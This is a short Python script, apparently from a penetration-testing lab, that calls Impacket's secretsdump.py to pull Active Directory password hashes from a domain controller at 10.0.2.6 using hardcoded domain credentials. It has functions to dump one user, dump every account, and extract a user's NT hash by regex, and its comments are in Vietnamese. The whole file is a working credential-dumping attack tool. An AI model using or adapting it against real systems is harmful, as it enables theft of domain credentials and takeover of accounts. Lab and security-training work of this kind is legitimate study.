import subprocess
import re

def dump_only_person(username):
    try:
        subprocess.run(f"python secretsdump.py duongquanghao110.it/bnh:12345@10.0.2.6 -just-dc-user {username}", check=True)
    except subprocess.CalledProcessError as e:
        print("Error:", e)
    
def analyze_minidump():
    try:
        subprocess.run("python secretsdump.py duongquanghao110.it/bnh:12345@10.0.2.6 -just-dc", check=True)
    except subprocess.CalledProcessError as e:
        print("Error:", e)

def dump_hash(username):
    try:
        result = subprocess.run(
            f"python secretsdump.py duongquanghao110.it/bnh:12345@10.0.2.6 -just-dc-user {username}",
            check=True, capture_output=True, text=True
        )
        
        # Tìm kiếm phần tử thứ 2 (nthash) trong đầu ra
        match = re.search(r':\d+:[a-f0-9]{32}:([a-f0-9]{32})', result.stdout)
        if match:
            print("Nthash:", match.group(1))
            return match.group(1)
        else:
            print("Không tìm thấy nthash.")
    
    except subprocess.CalledProcessError as e:
        print("Lỗi:", e)
